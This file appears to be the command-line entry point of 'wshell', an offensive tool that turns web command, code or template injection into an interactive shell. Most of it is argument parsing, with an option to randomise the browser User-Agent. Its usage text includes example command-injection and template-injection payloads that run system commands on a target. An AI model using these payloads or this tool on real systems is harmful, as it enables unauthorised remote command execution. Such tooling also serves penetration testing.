import argparse
import json
import os
import random
import re
import sys
import textwrap
import urllib.parse
from typing import List
from urllib.parse import urlparse

import requests
import requests.utils

import wshell
from wshell import settings, validators
from wshell.cli import WShellCmd
from wshell.errors import WShellError
from wshell.httpdata import to_nested_dictionary
from wshell.injectors import OSEnum, get_command_injector
from wshell.log import logger
from wshell.scripts import input_scripts, output_scripts
from wshell.status import ExitStatus
from wshell.update import Updater


# noinspection PyDefaultArgument
def main(args: List[str] = sys.argv) -> ExitStatus:
    """
    Process arguments and run the main workflow.
    :param args list of command line arguments to parse
    :return exit status code.
    """
    # remove program name from args to not be confused as positional argument
    _, *args = args

    parser = argparse.ArgumentParser(
        prog="wshell",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Turn a web-based {code,command,template} injection in a full featured shell with ease",
        epilog=textwrap.dedent(f'''
            For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT

            Example usage:

                wshell 'https://www.example.com/webshell?cmd={settings.DEFAULT_COMMAND_PLACEHOLDER}'
                wshell --form 'https://www.example.com/command-injection' 'p=;{settings.DEFAULT_COMMAND_PLACEHOLDER} #'
                wshell 'https://www.example.com/ssti' 'msg=${{self.module.cache.util.os.system("{settings.DEFAULT_COMMAND_PLACEHOLDER}")}}'
        '''),
        add_help=True,
        allow_abbrev=False
    )
    parser.add_argument(
        "-v", "--version",
        action="version",
        version=f"%(prog)s v{wshell.VERSION}",
        help="Show the version number and exit"
    )

    # WShell specific parameters
    parser.add_argument(
        "--placeholder",
        dest="command_placeholder",
        type=validators.not_empty,
        default=settings.DEFAULT_COMMAND_PLACEHOLDER,
        help="Use a custom command placeholder (default: %(default)s)"
    )
    parser.add_argument(
        "--os",
        default=None,
        choices=[*OSEnum],
        help="Specify OS and shell in use on the target (default: auto-discover)"
    )

    # HTTP-related parameters
    http_group = parser.add_argument_group(title='HTTP arguments')
    http_group.add_argument(
        "-m", "--method",
        help="The HTTP method to be used for the requests (Default: POST if there is some data, GET otherwise)"
    )
    timeout_http_group = http_group.add_mutually_exclusive_group(required=False)
    timeout_http_group.add_argument(
        "-t", "--timeout",
        metavar="SECONDS",
        type=validators.positive_float,
        default=settings.DEFAULT_TIMEOUT,
        help="The connection timeout of the request in seconds (default: %(default)s)"
    )
    timeout_http_group.add_argument(
        "--no-timeout",
        action="store_const",
        dest="timeout",
        const=None,
        help="Disable the connection timeout"
    )
    http_group.add_argument(
        "-d", "--delay",
        type=validators.positive_float,
        default=settings.DEFAULT_DELAY,
        help="Delay in seconds between each HTTP request (default: %(default)s)"
    )
    persistent_connection_http_group = http_group.add_mutually_exclusive_group(required=False)
    persistent_connection_http_group.add_argument(
        "--keep-alive",
        action="store_true",
        dest="reuse_connection",
        default=settings.DEFAULT_REUSE_CONNECTION,
        help="Use persistent connection (default: %(default)s)"
    )
    persistent_connection_http_group.add_argument(
        "--no-keep-alive",
        action="store_false",
        dest="reuse_connection",
        help=argparse.SUPPRESS
    )
    follow_http_group = http_group.add_mutually_exclusive_group(required=False)
    follow_http_group.add_argument(
        "--follow",
        default=settings.DEFAULT_ALLOW_REDIRECTS,
        action="store_true",
        dest="allow_redirects",
        help="Follow 30x Location redirects (default: %(default)s)"
    )
    follow_http_group.add_argument(
        "--no-follow",
        action="store_false",
        dest="allow_redirects",
        help=argparse.SUPPRESS
    )
    user_agent_http_group = http_group.add_mutually_exclusive_group(required=False)
    user_agent_http_group.add_argument(
        "-ua", "--user-agent",
        default=settings.DEFAULT_USER_AGENT,
        help="Use a custom User-Agent (default: %(default)s)"
    )
    user_agent_http_group.add_argument(
        "-r", "--random-agent",
        dest="use_random_agent",
        action="store_true",
        help="Use a random valid browser User-Agent"
    )
    post_data_http_group = http_group.add_mutually_exclusive_group(required=False)
    post_data_http_group.add_argument(
        "-j", "--json",
        dest="use_json_post_data",
        action="store_true",
        default=settings.DEFAULT_USE_JSON_POST_DATA,
        help="Data items from the command line are serialized as a JSON object (default: %(default)s)"
    )
    post_data_http_group.add_argument(
        "-f", "--form",
        dest="use_json_post_data",
        action="store_false",
        help="Data items from the command line are serialized as form fields"
    )
    http_group.add_argument(
        "--data-raw",
        dest="raw_data",
        help="Specify raw data to be sent as is (both as form fields or as JSON object)"
    )

    log_group = parser.add_argument_group(title="Logging arguments")
    log_group.add_argument(
        "--log",
        dest="log_level",
        choices=["critical", "error", "warning", "info", "debug"],
        default=settings.DEFAULT_LOG_LEVEL,
        help="To specify the log messages level"
    )

    scripts_group = parser.add_argument_group(title="Input/Output scripts")
    scripts_group.add_argument(
        "--list-scripts",
        action="store_true",
        help="List the available scripts to manipulate input/output"
    )

    scripts_group.add_argument(
        "--input-scripts",
        dest="input_scripts",
        default=[],
        type=validators.input_scripts_chain,
        help="Use one or more custom input script (comma separated, order matters)"
    )

    scripts_group.add_argument(
        "--output-scripts",
        dest="output_scripts",
        default=[],
        type=validators.output_scripts_chain,
        help="Use one or more custom output script (comma separated, order matters)"
    )

    # Automatic update
    update_group = parser.add_argument_group(title='Automatic updates')
    enable_update_group = update_group.add_mutually_exclusive_group(required=False)
    enable_update_group.add_argument(
        "--update",
        action="store_true",
        default=settings.DEFAULT_CHECK_FOR_UPDATES,
        help="Check for updates on startup (default: %(default)s)"
    )
    enable_update_group.add_argument(
        "--no-update",
        dest="update",
        action="store_false",
        help="Do not check for updates on startup"
    )
    prerelease_update_group = update_group.add_mutually_exclusive_group(required=False)
    prerelease_update_group.add_argument(
        "--include-prerelease",
        action="store_true",
        default=settings.DEFAULT_INCLUDE_PRERELEASE,
        help="Includes pre-release while searching for updates (default: %(default)s)"
    )
    prerelease_update_group.add_argument(
        "--no-include-prerelease",
        dest="include_prerelease",
        action="store_false",
        help="Includes stable releases only while searching for updates"
    )

    # Positional parameters
    parser.add_argument(
        "url",
        metavar="URL",
        type=validators.http_url,
        help="The endpoint URL where the injection is"
    )
    parser.add_argument(
        "request_items",
        metavar="REQUEST ITEMS",
        nargs=argparse.ZERO_OR_MORE,
        default=[],
        help="POST data and headers ('key=value' for data, 'key:value' for headers)"
    )

    # Pre-parsing of arguments
    # Note: argparse is not flexible enough to have an argument with precedence over
    #       required positional arguments, so we have to check manually
    if "-h" not in args and "--help" not in args:
        # If the user asked for the scripts list, print it and exit
        if "--list-scripts" in args:
            for script_type, scripts in [("Input scripts", input_scripts), ("Output scripts", output_scripts)]:
                print(f"{script_type}:")
                for script_name, func in scripts.items():
                    print(f"  {script_name} - {func.__doc__}")
                print()

            return ExitStatus.SUCCESS

    parsed_args = parser.parse_intermixed_args(args=args)

    # Specify the log level to the WShell root logger
    logger.setLevel(parsed_args.log_level.upper())

    if parsed_args.update:
        Updater(parsed_args.include_prerelease).update()

    if parsed_args.use_random_agent:
        # Pick a random user-agent excluding empty and comment lines
        with open(os.path.join(wshell.DATA_DIR, "user-agents.txt"), "r") as f:
            parsed_args.user_agent = random.choice(
                [line for line in f.read().splitlines() if line and not line.startswith("#")]
            )

    requests.utils.default_user_agent = lambda: parsed_args.user_agent

    # Parse positional arguments to extract POST data and headers
    post_data_regex = re.compile(r"(?P<key>[\w\-.]+(\[\w*\])*)=(?P<value>.*)")  # POST data are in the form "key=value", "key[]=value" or "key[other]=value"
    headers_regex = re.compile(r"(?P<key>[\w\-.]+):\s*(?P<value>.*)")  # HTTP headers are in the form "key:value"

    post_data = dict()
    headers = dict()

    # Search for custom headers and/or POST data
    for request_item in parsed_args.request_items:
        match = post_data_regex.match(request_item)
        if match:
            post_data[match.group('key')] = match.group('value')
            continue

        match = headers_regex.match(request_item)
        if match:
            headers[match.group('key')] = match.group('value')
            continue

        parser.error(f"Unrecognized argument: {request_item}")

    if parsed_args.use_json_post_data:
        post_data = to_nested_dictionary(post_data)

    # Parse raw data and merge it with POST data
    if parsed_args.raw_data:
        if parsed_args.use_json_post_data:
            raw_data = json.loads(parsed_args.raw_data)
        else:
            raw_data = dict(urllib.parse.parse_qsl(parsed_args.raw_data, keep_blank_values=True))

        # Ensure mixed data are of the same type
        if isinstance(post_data, dict) and isinstance(raw_data, dict):
            post_data = post_data | raw_data
        elif post_data and raw_data:
            parser.error(f"Request items and raw data have incompatible types, cannot merge {type(post_data).__name__} and {type(raw_data).__name__}")
        else:
            post_data = post_data or raw_data

    # Replace raw request items with parsed ones
    delattr(parsed_args, "request_items")
    parsed_args.post_data = post_data
    parsed_args.headers = headers

    if not parsed_args.method:
        parsed_args.method = "POST" if post_data else "GET"
        logger.info(f"HTTP verb not specified. Using '{parsed_args.method}' based on parameters")

    if parsed_args.os:
        parsed_args.os = OSEnum(parsed_args.os)

    # Extract host domain to persist history on specific file
    host: str = urlparse(parsed_args.url).hostname
    history_file = os.path.join(wshell.USER_HISTORY_DIR, f"{host}.json")
    parsed_args.history_file = history_file

    return program(parsed_args)


def program(args: argparse.Namespace) -> ExitStatus:
    """
    The main program.
    Use the parsed arguments to start the wshell command loop
    """
    try:
        injector = get_command_injector(
            os=args.os,
            allow_redirects=args.allow_redirects,
            timeout=args.timeout,
            delay=args.delay,
            reuse_connection=args.reuse_connection,
            use_json_post_data=args.use_json_post_data,
            method=args.method,
            url=args.url,
            post_data=args.post_data,
            headers=args.headers,
            command_placeholder=args.command_placeholder,
            input_scripts=args.input_scripts,
            output_scripts=args.output_scripts
        )

        WShellCmd(
            injector=injector,
            persistent_history_file=args.history_file
        ).cmdloop()
    except WShellError as error:
        logger.error(f"{error.__class__.__name__}: {error}")
        return error.EXIT_STATUS

    return ExitStatus.SUCCESS
